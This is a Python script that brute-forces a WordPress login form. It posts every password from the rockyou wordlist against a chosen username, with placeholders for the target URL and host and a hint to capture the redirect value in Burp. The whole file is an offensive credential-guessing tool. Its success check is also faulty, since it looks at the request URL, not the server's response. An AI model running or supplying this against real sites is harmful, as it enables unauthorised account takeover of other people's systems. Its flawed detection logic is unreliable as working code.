import requests

url = '' # Enter the url + wp-login
username = '' # Enter the username
passwd_path = '/usr/share/wordlists/rockyou.txt'

headers = {
	'Host': '', # Enter the host (domain)
	'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
}

data = {
	'log': username,
	'pwd': "",
	'wp-submit': 'Se+connecter',
	'redirect_to': '', # Send a request to burp repeater to know it
	'testcookie': '1',
}

#Loop of brute force
with open(passwd_path, 'r') as file:
	for password in file:
		password = password.strip()
		
		data['pwd'] = password

		req = requests.post(url, headers=headers,data=data)

		# Conditions to know if the password as be found
		if "ce mot de passe ne correspond pas à l’identifiant" in req.text:
			print(f"[-] Not found with {data['pwd']}")
			print(req)
		elif "wp-admin" in url:
			print("\033[0;32m" + "[+] " + "\033[0m" + f"Password found with {data['pwd']}")
			exit()
		else:
			# print(f"[~] Password seems to have been found with {data['pwd']}")
			print("\033[0;33m" + "[~] " + "\033[0m" + f"Password seems to have been found with {data['pwd']}")
			print(f"Message: {req}")
			print(req.text)
